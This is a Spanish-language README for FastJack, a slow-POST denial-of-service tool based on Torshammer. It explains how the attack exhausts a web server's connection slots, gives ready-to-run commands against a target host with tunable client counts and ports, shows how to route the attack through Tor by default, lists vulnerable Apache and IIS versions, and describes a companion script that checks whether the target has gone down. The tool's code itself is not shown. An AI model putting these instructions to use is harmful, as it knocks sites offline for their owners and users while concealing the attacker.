![alt text](https://raw.githubusercontent.com/neo-jack-official/FastJack/master/img/vista.png)
# fastjack.py - FastJack es un remake (nueva version) de Torshammer 1.0, re editado por Neo-Jack ENE/2020

## ¿Qué es FasJack?
Es una herramienta de prueba lenta de denegación de servicios POST.


## ¿Como funciona?
1. Realiza publicaciones POST, por clientes pre asignados.(defecto: 256, recomendado de 128 a 320)
2. se envian encabezados periódicamente (cada ~ 0.1 seg.) de forma continua, sin pausas.
3. Nunca se cierra la conexión a menos que el servidor lo haga. Si el servidor cierra una conexión, se crea una nueva (se muestra como "Re-Conectando Cliente") y seguimos haciendo lo mismo.
4. Cuando activa Tor:Por defecto se conexta a servidor TOR en 127.0.0.1:9050.
5. FastJack incorpora Modulo independiente HostJack-Checker.py beta, con auto Ejecucion. (verifica estado del Servidor, cada 9.5 Seg en ventana independiente)

Esto llena el cupo de peticiones del servidor inundandolo y evita que pueda responder a peticiones externas de terceros.

## Como Instalar PYTHON?

FastJack es un archivo con extencion "Py", solo requiere tener pre instalado Python.

## Preparamos la instalacion para python

* `sudo apt-get update`
* `sudo apt-get install build-essential checkinstall`
* `sudo apt-get install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev`
* `sudo apt-get install python2.7`
* `sudo apt-get install python3.6`

## Revisamos que python esta instalado correctamente

* `python -V | python3 -V`

## Opciones de Configuracion

* `-h = Ayuda`
* `-t = Para fijar Targer WEB` # Nota: ES REQUERIDO USAR -t
* `-p = Puerto, por defecto : 80`
* `-r = Clientes, por defecto : 256` recomendacion (entre 128 a 320)
* `-T = Habilitar el enrutamiento TOR, por defecto: Desactivado`

## Como lo utiliso?

Si `fastjack.py` esta en Escritorio
1) Abra terminal, Escriba `cd Escritorio`
2) Ejecute bajo Python `python fastjack.py -t www.ejemplo.com`

## Ejemplos de comandos.

  Cambiando cantidad de Clientes:
* `python fastjack.py -t www.ejemplo.com -r 128` Para 128 Clientes
  Cambiando el puerto:
* `python fastjack.py -t www.ejemplo.com -p 443` Para cambiar puerto defecto 80 a 443.
  Combinando comandos:
* `python fastjack.py -t www.ejemplo.com -r 128 -p 443`
* `python fastjack.py -t www.ejemplo.com -T` Activando TOR


## Servidores Afectados
Servidores web desprotegidos que ejecutan Apache e IIS a través de una sola instancia.
Apache 1.X y IIS anteriores con ~ 128 Clientes.
Los nuevos IIS y Apache 2.X con ~ 256 Clientes.

## Problemas.

# 1) Puedes dejar activa la conexion TOR de forma automatica.

Edite fastjack.py con su editor de texto favorito:
1) Busque las lineas:

* target = ''
* threads = 256
* `tor = False`
* port = 80 

2) Modifique:
* tor = False
por: 
* `tor = True`

# 2) Si usted tiene un Terminal distinto a (Genome Terminal)

Edite fastjack.py con su editor de texto favorito o use fastjack-pure.py:
1) Busque la linea:
       ` os.system("gnome-terminal -- python hostjack-checker.py " + target + " " + torstatus) `

2) Modifiquela colocando un # al principio de la linea
       `# os.system("gnome-terminal -- python hostjack-checker.py " + target + " " + torstatus) `

De esta forma desactivara el modulo acoplado HostJack-Checker sin afectar el funcionamiento de FastJack

HostJack-Checker podra ejecutarlo de forma separada. y Activar TOR si lo desea.

-Sin TOR
* `python hostjack-checker.py www.ejemplo.com `
* `python hostjack-checker.py www.ejemplo.com -F`

-Con TOR
* `python hostjack-checker.py www.ejemplo.com -T`

HostJack-Checker NO requiere de argumento -t para operar.

## Agradecimientos a:
ShadowsDdos : Colaboracion en gestion modular de codigo para comportamiento autonomo de forma independiente con captacion de variable.



